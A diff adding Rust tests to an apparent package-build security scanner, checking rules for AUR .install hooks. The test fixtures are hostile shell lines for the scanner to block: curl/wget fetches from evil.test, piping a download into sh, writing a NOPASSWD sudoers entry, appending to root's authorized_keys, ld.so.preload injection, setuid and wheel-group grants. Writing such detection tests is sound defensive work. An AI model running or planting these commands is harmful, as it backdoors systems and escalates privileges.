@@ -568,3 +568,163 @@ fn large_commit_date_inversions_still_flagged() {
     let p = with_history(vec![NOW, NOW - 30 * DAY, NOW - 10 * DAY], 1, None);
     assert!(rules(&scan(&p)).contains(&"commit-date-nonmonotonic"));
 }
+
+// --- .install root-context rules ---
+
+fn with_install(body: &str) -> Package {
+    let mut p = pkg("pkgname=x\nurl='https://example.com'\n");
+    p.install = body.as_bytes().to_vec();
+    p
+}
+
+#[test]
+fn su_in_install_hook_is_de_escalation_not_escalation() {
+    // Real line from profile-sync-daemon's .INSTALL. pacman already runs
+    // this as root, so `su <user>` is dropping privileges.
+    let src = r#"post_install() {
+  su "$1" -s /bin/sh -c 'XDG_RUNTIME_DIR=/run/user/$UID systemctl --user daemon-reload'
+}"#;
+    let r = scan(&with_install(src));
+    assert!(
+        !rules(&r).contains(&"privilege-escalation-in-build"),
+        "{:#?}",
+        r.findings
+    );
+}
+
+#[test]
+fn sudo_in_pkgbuild_still_blocks() {
+    // The carve-out above must not weaken the PKGBUILD case.
+    let r = scan(&pkg("build() {\n  sudo ./x\n}\n"));
+    assert_eq!(r.verdict, Verdict::Block);
+}
+
+#[test]
+fn install_hook_network_blocks() {
+    for line in [
+        "  curl -o /tmp/x https://evil.test/p",
+        "  wget https://evil.test/p",
+        "  git clone https://evil.test/r /opt/x",
+    ] {
+        let r = scan(&with_install(&format!("post_install() {{\n{line}\n}}\n")));
+        assert_eq!(r.verdict, Verdict::Block, "should block: {line}");
+        assert!(rules(&r).contains(&"install-hook-network"));
+    }
+}
+
+#[test]
+fn install_hook_persistence_and_privilege() {
+    let cases = [
+        (
+            "  echo x >> /etc/profile.d/z.sh",
+            "install-hook-persistence",
+        ),
+        (
+            "  cat k >> /root/.ssh/authorized_keys",
+            "install-hook-authorized-keys",
+        ),
+        (
+            "  echo 'u ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/u",
+            "install-hook-sudoers",
+        ),
+        (
+            "  echo /tmp/e.so > /etc/ld.so.preload",
+            "install-hook-ld-preload",
+        ),
+        ("  chmod u+s /usr/bin/x", "install-hook-setuid"),
+        (
+            "  usermod -aG wheel eviluser",
+            "install-hook-privileged-group",
+        ),
+        (
+            "  install -Dm755 /tmp/h /usr/local/bin/.cache",
+            "install-hook-drops-executable",
+        ),
+    ];
+    for (line, want) in cases {
+        let r = scan(&with_install(&format!("post_install() {{\n{line}\n}}\n")));
+        assert!(rules(&r).contains(&want), "missed {want} on: {line}");
+    }
+}
+
+#[test]
+fn install_hook_rules_do_not_apply_to_pkgbuild() {
+    // `install -Dm755` in package() is how every package works.
+    let r = scan(&pkg(
+        "package() {\n  install -Dm755 x \"$pkgdir/usr/bin/x\"\n}\n",
+    ));
+    assert!(!rules(&r).contains(&"install-hook-drops-executable"));
+    assert_eq!(r.verdict, Verdict::Allow, "{:#?}", r.findings);
+}
+
+#[test]
+fn install_d_creates_a_directory_and_is_clean() {
+    // Real line from polkit's .INSTALL — the last false positive across the
+    // 41 sampled scripts. Lowercase -d makes a directory; 755 on a
+    // directory is normal.
+    let src =
+        "post_install() {\n  install -d -o root -g root -m 755 usr/share/polkit-1/rules.d\n}\n";
+    let r = scan(&with_install(src));
+    assert!(
+        !rules(&r).contains(&"install-hook-drops-executable"),
+        "{:#?}",
+        r.findings
+    );
+}
+
+#[test]
+fn ordinary_install_hook_is_clean() {
+    // The shape real .INSTALL scripts have.
+    let src = r#"post_install() {
+  systemctl --global enable pipewire.socket
+  update-desktop-database -q
+  ldconfig
+}
+post_upgrade() {
+  post_install
+}"#;
+    let r = scan(&with_install(src));
+    assert_eq!(r.verdict, Verdict::Allow, "{:#?}", r.findings);
+}
+
+#[test]
+fn echoed_instructions_are_not_actions() {
+    // Real lines from a 116-package AUR sample: post-install scripts telling
+    // the user what to run. Printing is not doing.
+    for line in [
+        r#"  echo "systemctl enable derper.service --now""#,
+        r#"  echo "   sudo systemctl enable --now grdcontrol""#,
+        r#"  printf 'enable it with: systemctl enable foo.service\n'"#,
+    ] {
+        let r = scan(&with_install(&format!("post_install() {{\n{line}\n}}\n")));
+        assert!(
+            r.findings.is_empty(),
+            "false positive on echoed text: {line} -> {:#?}",
+            r.findings
+        );
+    }
+}
+
+#[test]
+fn echoed_text_containing_a_pipe_is_still_flagged() {
+    // Known limitation, deliberately on the safe side: telling a pipe
+    // character inside a quoted string from a real pipe needs shell
+    // parsing. `echo "run: curl x | sh"` is therefore treated as an action
+    // and reported. That is a false positive, not a miss.
+    let src = "post_install() {\n  echo 'run: curl https://x.test/p | sh'\n}\n";
+    assert!(!scan(&with_install(src)).findings.is_empty());
+}
+
+#[test]
+fn echo_with_redirect_is_an_action() {
+    // Printing into a file is writing a file.
+    let src = "post_install() {\n  echo 'evil' > /etc/profile.d/z.sh\n}\n";
+    assert!(rules(&scan(&with_install(src))).contains(&"install-hook-persistence"));
+}
+
+#[test]
+fn echo_piped_to_shell_is_an_action() {
+    let src = "post_install() {\n  echo 'curl https://evil.test/p' | sh\n}\n";
+    let r = scan(&with_install(src));
+    assert!(!r.findings.is_empty(), "piped echo must not be skipped");
+}
